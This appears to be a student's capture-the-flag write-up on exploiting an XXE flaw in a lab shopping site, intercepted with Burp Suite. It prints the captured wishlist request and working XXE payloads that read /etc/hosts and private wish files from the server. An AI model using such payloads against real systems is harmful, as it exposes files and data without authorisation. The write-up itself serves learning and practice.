This one was pretty easy.
Step 1:
This task was all about XXE injections and burp suite, luckily I already knew this because of picoctf.
So to get started we were given a website on which I had to explore different options, so to get started I added a product into my cart and I went to view my cart.
There I got an error message when I clicked on wish#21, that admin privileges were required to view the different wishes.

![image](https://github.com/user-attachments/assets/b3ad5302-d732-4be1-9003-3cd66f4aac91)

Step 2:
This is what was to be done, to access different wishes of people(gaining access to that sensitive information).
So that is where burp suite comes into play.
so burp suite was used here to intercept the request when a product was added to the wishlist.

Where the following request was intercepted:
~~~
POST /wishlist.php HTTP/1.1
Host: 10.10.211.203
Content-Length: 215
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://10.10.211.203
Referer: http://10.10.211.203/product.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


                <wishlist>
                    <user_id>1</user_id>
                    <item>
                        <product_id>2</product_id>
                    </item>
                </wishlist>
~~~

What I had to do was replace the xml code so that it can be exploited using the xxe injection.

Step 3:
To do this I sent it to the repeater tab where I replaced it with:
~~~
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
~~~
which gave me some specific response.

Then I tried something different in the entity so as to gain access to different wishes:
~~~
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
~~~
this gave me access to the 1st wish.
![image](https://github.com/user-attachments/assets/ae960be8-d522-4c5d-bd25-f3dfde2e93b6)


Now I had to find a flag which was in some wish number x which was supposed to be guessed by hit and trial of course, and wish number 15 gave me the flag.
![image](https://github.com/user-attachments/assets/11ac6789-cd7f-492a-aa6f-1e0e0b678c8c)



then I had to head to the /changelog url to get the next flag.
![image](https://github.com/user-attachments/assets/35a3ede5-9124-445e-938f-2adfde9c19ac)

Learnings:
Just got a nice little revision of burp suite and xxe injection.

